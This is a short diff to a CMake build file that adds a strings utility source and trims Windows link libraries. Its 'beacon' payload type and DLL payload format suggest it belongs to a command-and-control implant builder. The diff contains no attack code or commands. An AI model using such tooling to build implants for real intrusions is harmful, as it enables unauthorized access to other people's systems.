@@ -125,6 +125,7 @@ set(SOURCE_CORE
         src/core/utils/convert.cpp
         src/core/utils/random.cpp
         src/core/utils/split.cpp
+        src/core/utils/strings.cpp
 )
 
 if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
@@ -144,7 +145,7 @@ if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
 endif()
 
 # LINK LIBRATILIES
-link_libraries(bcrypt crypt32 dbghelp gdi32 gdiplus iphlpapi netapi32 ntdll psapi winhttp wsock32 ws2_32)
+link_libraries(bcrypt dbghelp gdi32 gdiplus iphlpapi netapi32 psapi wsock32 ws2_32)
 
 # ADD
 if(${PAYLOAD_FORMAT} STREQUAL "dll")
